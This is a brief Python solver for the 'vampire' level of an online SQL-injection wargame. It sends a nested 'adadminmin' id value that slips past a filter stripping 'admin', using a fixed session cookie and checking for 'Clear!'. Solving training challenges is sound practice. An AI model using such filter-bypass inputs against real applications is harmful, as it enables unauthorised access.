import requests

url ="https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php/"
cookie = {"PHPSESSID":"c0bed5cfkoofgp0l3nfhdr2c89"}

null = "admin"
if requests.get(url,{"id":f"ad{null}min"},cookies=cookie).text.find("Clear!") > 0:print("[*] Success")
